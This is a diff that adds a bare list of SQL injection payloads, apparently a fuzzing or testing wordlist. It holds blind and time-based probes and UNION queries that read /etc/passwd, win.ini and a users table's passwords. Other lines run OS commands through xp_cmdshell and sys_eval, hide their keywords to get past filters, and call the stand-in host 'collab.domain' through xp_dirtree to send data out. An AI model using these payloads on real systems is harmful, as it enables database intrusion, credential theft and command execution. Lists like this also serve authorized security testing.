@@ -1,0 +1,19 @@
+' AND (SELECT COUNT(*) FROM users) > 0--
+' UNION SELECT NULL,NULL,LOAD_FILE('/etc/passwd')--
+' UNION SELECT sys_eval('id'),NULL,NULL--
+' AND pg_sleep(5)--
+'; IF(1=1) WAITFOR DELAY '00:00:05'--
+'; EXEC xp_cmdshell 'whoami'--
+' UNION SELECT CHR(97)||CHR(98)||CHR(99),NULL FROM dual--
+' UNION SELECT version(), current_database()--
+' UNION SELECT NULL, sqlite_version(), NULL--
+'; DECLARE @q VARCHAR(99); SET @q='\\\\collab.domain\\path'; EXEC master.dbo.xp_dirtree @q;--
+XOR(if(now()=sysdate(),SLEEP((5)),0))XOR
+*(CASE WHEN 0=1 THEN 1 ELSE 0 END)
+/*!98765%75Nio%4e*//**//*!%73eL%65cT*//**/p%41sSw%6fRd/**/fR%4fM users--
+' || 1=1;-- -
+' UNION SELECT * FROM OPENROWSET(BULK 'C:/windows/win.ini', SINGLE_CLOB) AS x--
+' AND 1=1--
+' AND 1=2--
+' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
